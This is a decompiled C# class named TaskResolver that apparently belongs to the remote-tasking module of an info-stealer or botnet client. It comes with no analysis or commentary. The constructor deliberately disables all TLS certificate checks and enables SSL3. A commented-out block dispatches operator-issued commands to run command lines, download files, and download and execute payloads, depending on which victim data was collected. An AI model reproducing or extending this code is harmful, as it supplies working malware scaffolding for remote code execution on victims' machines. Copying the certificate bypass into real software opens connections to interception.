using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

// Token: 0x02000032 RID: 50
public class TaskResolver
{
	// Token: 0x06000106 RID: 262 RVA: 0x0000968C File Offset: 0x0000788C
	public TaskResolver(Entity_CollectedResults result)
	{
		this.Result = result;
		try
		{
			try
			{
				ServicePointManager.SecurityProtocol |= (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12);
			}
			catch
			{
			}
			ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
		}
		catch
		{
		}
	}

	// Token: 0x17000008 RID: 8
	// (get) Token: 0x06000107 RID: 263 RVA: 0x0000332A File Offset: 0x0000152A
	public Entity_CollectedResults Result { get; }

	// Token: 0x06000108 RID: 264 RVA: 0x00009710 File Offset: 0x00007910
	public List<int> ReleaseUpdates(IEnumerable<Entity_Task> tasks)
	{
		List<int> list = new List<int>();
		try
		{
			foreach (Entity_Task entity in tasks)
			{
				list.Add(entity.Id1);
				/*
				if (this.Result.DomainExists(entity.Id4))
				{
					CommandLineUpdate commandLineUpdate = new CommandLineUpdate();
					if (commandLineUpdate.IsValidAction(entity.Id3) && commandLineUpdate.Process(entity))
					{
						list.Add(entity.Id1);
					}
					DownloadUpdate downloadUpdate = new DownloadUpdate();
					if (downloadUpdate.IsValidAction(entity.Id3) && downloadUpdate.Process(entity))
					{
						list.Add(entity.Id1);
					}
					DownloadAndExecuteUpdate downloadAndExecuteUpdate = new DownloadAndExecuteUpdate();
					if (downloadAndExecuteUpdate.IsValidAction(entity.Id3) && downloadAndExecuteUpdate.Process(entity))
					{
						list.Add(entity.Id1);
					}
					OpenUpdate openUpdate = new OpenUpdate();
					if (openUpdate.IsValidAction(entity.Id3) && openUpdate.Process(entity))
					{
						list.Add(entity.Id1);
					}
				}
				*/
			}
		}
		catch
		{
		}
		return list;
	}
}
